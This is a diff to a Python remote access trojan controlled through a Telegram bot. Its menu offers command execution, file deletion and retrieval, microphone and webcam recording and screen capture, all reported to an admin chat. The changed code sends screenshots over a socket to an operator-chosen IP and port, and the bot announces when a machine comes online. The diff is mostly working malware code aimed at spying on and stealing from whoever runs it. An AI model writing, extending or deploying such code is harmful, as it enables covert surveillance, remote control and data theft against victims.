@@ -17,19 +17,6 @@ from telebot.types import KeyboardButton, ReplyKeyboardMarkup, ReplyKeyboardRemo
 from PIL import Image
 
 
-""" Variables """
-API_TOKEN = "token"
-ADMIN_ID = id
-bot = TeleBot(API_TOKEN)
-
-markup = ReplyKeyboardMarkup(True, True)
-markup.add(KeyboardButton("cd"), KeyboardButton("chdir"),
-        KeyboardButton("dir"), KeyboardButton("rm_file"),
-        KeyboardButton("exec_cmd"), KeyboardButton("get_file"), 
-        KeyboardButton("record_audio"), KeyboardButton("get_audio"),
-        KeyboardButton("record_video"), KeyboardButton("get_video"),
-        KeyboardButton("get_screen"))
-
 
 """ Fn """
 def checkID(ms):
@@ -83,6 +70,8 @@ def recordAUDIO(self, time=6):
         wf.writeframes(b"".join(frames))
 
         wf.close()
+
+
 
 """ Functional """
 class Client:
@@ -305,47 +294,60 @@ class Client:
                         PORT = int(list_data[0])
                         IP = list_data[1]
 
-                        clientsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                        __running = True
                         
-                        while True:
-                            try:
-                                bot.send_message(ADMIN_ID, "Connection attempt 🎲")
-                                clientsocket.connect((IP, PORT))
-                                break
-                            except Exception as e:
-                                bot.send_message(ADMIN_ID, "Сonnection error ❌")
-                                time.sleep(3)
+                        try:
+                            bot.send_message(ADMIN_ID, "Connection attempt 🎲")
+                            sock.connect((IP, PORT))
+                        except Exception as e:
+                            bot.send_message(ADMIN_ID, "Сonnection error ❌", reply_markup=markup)
 
-                        bot.send_message(ADMIN_ID, "Successful connection ✅")
-                        while True:
+                        bot.send_message(ADMIN_ID, "Successful connection ✅", reply_markup=markup)
+                        while __running:
                             screen = pyautogui.screenshot()
                             frame = np.array(screen)
                             frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
-                            image = cv2.resize(frame, (1024, 576), interpolation=cv2.INTER_AREA)
+                            frame = cv2.resize(frame, (1440, 900), interpolation=cv2.INTER_AREA)
                             result, frame = cv2.imencode('.jpg', frame, [int(cv2.IMWRITE_JPEG_QUALITY), 90])
                             data = pickle.dumps(frame, 0)
                             
                             try:
-                                clientsocket.sendall(struct.pack(">L", len(data)) + data)
+                                sock.sendall(struct.pack(">L", len(data)) + data)
                             except ConnectionResetError:
-                                self.__running = False
+                                __running = False
                             except ConnectionAbortedError:
-                                self.__running = False
+                                __running = False
                             except BrokenPipeError:
-                                self.__running = False
-                            
+                                __running = False
+
                     except Exception as e:
-                        bot.send_message(ADMIN_ID, f"Error:\n{e}")
+                        bot.send_message(ADMIN_ID, f"Error:\n{e}", reply_markup=markup)
                 else:
                     bot.send_message(ADMIN_ID, "EXIT", reply_markup=markup)
-                    
+
             bot.register_next_step_handler(ms, getscreen_next)
+
+
+
+""" Variables """
+API_TOKEN = "token"
+ADMIN_ID = id
+bot = TeleBot(API_TOKEN)
+
+markup = ReplyKeyboardMarkup(True, True)
+markup.add(KeyboardButton("cd"), KeyboardButton("chdir"),
+        KeyboardButton("dir"), KeyboardButton("rm_file"),
+        KeyboardButton("exec_cmd"), KeyboardButton("get_file"), 
+        KeyboardButton("record_audio"), KeyboardButton("get_audio"),
+        KeyboardButton("record_video"), KeyboardButton("get_video"),
+        KeyboardButton("get_screen"))
+
 
 
 """ Start """
 client = Client()
-bot.send_message(ADMIN_ID, "ONLINE ✅")
-
+bot.send_message(ADMIN_ID, "ONLINE ✅", reply_markup=markup)
 
 @bot.message_handler(commands=["_start"])
 def send_welcome(ms):
@@ -358,8 +360,6 @@ def CheckCommand(ms):
     if checkID(ms):
         try:
             client.check_command(ms)
-        except KeyError:
-            bot.send_message(ADMIN_ID, "Function not found")
         except Exception as e:
             bot.send_message(ADMIN_ID, e)
 
